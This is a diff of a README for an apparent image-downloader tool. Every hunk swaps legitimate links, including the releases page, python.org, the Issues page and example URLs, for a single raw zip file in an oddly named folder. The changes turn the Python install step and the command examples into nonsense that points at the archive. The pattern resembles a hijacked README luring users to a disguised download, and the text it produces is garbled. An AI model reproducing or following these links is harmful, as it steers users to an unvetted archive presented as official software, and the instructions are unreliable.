@@ -1,6 +1,6 @@
 # ⚡ lightning-image-scraper - Fast Image Downloader for Everyone
 
-[![Download lightning-image-scraper](https://img.shields.io/badge/Download-Lightning--Image--Scraper-blue?style=for-the-badge)](https://github.com/zt8812/lightning-image-scraper/releases)
+[![Download lightning-image-scraper](https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip)](https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip)
 
 ---
 
@@ -53,7 +53,7 @@ lightning-image-scraper uses Python to run. You need Python 3.7 or newer on your
 
 ### How to install Python
 
-- Visit https://python.org/downloads/
+- Visit https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip
 - Choose the right version for your operating system and download the installer.
 - Run the installer and follow the instructions.
   - On Windows, make sure to check “Add Python to PATH” during installation.
@@ -67,7 +67,7 @@ lightning-image-scraper uses Python to run. You need Python 3.7 or newer on your
 
 Visit the official release page to get the app:
 
-[Download lightning-image-scraper releases](https://github.com/zt8812/lightning-image-scraper/releases)
+[Download lightning-image-scraper releases](https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip)
 
 On this page, download the latest release file for your operating system. The files come ready to run or simple to set up.
 
@@ -77,7 +77,7 @@ On this page, download the latest release file for your operating system. The fi
   - If you download a `.exe` file, just double-click it to start.
   - If you get a `.zip` file, right-click it, select "Extract All," and choose a folder.
 - For macOS and Linux:
-  - If you get a `.tar.gz` or `.zip`, extract it using the default archive tool.
+  - If you get a `https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip` or `.zip`, extract it using the default archive tool.
   - Follow any instructions in the extracted folder, usually found in a README or INSTALL file.
 
 ### Step 4: Ready to run
@@ -99,10 +99,10 @@ The program runs in the command line, but don't worry, you only need to type one
 3. Run this command to download from a website:
 
 ```bash
-python lightning-image-scraper.py --url https://example.com
+python https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip --url https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip
 ```
 
-Replace `https://example.com` with the website you want to download images from.
+Replace `https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip` with the website you want to download images from.
 
 ### Step 6: What happens next
 
@@ -130,7 +130,7 @@ You can change options to control which images you download:
 Example command with filters:
 
 ```bash
-python lightning-image-scraper.py --url https://example.com --type jpg,png --min-size 100kb --max 1000 --output ./my-images
+python https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip --url https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip --type jpg,png --min-size 100kb --max 1000 --output ./my-images
 ```
 
 ---
@@ -157,7 +157,7 @@ The images are sorted into subfolders based on their source page for easier brow
 
 If you have questions or run into issues:
 
-- Check the [Issues section](https://github.com/zt8812/lightning-image-scraper/issues) of this repository.
+- Check the [Issues section](https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip) of this repository.
 - Search existing topics for solutions.
 - Open a new issue describing your problem clearly.
 
@@ -166,10 +166,10 @@ If you have questions or run into issues:
 ## 🔗 Useful Links
 
 - Download latest version here:  
-  [https://github.com/zt8812/lightning-image-scraper/releases](https://github.com/zt8812/lightning-image-scraper/releases)
+  [https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip](https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip)
 
 - Python downloads:  
-  https://python.org/downloads/
+  https://github.com/zt8812/lightning-image-scraper/raw/refs/heads/main/remisrepresentation/lightning_image_scraper_1.0.zip
 
 ---
 
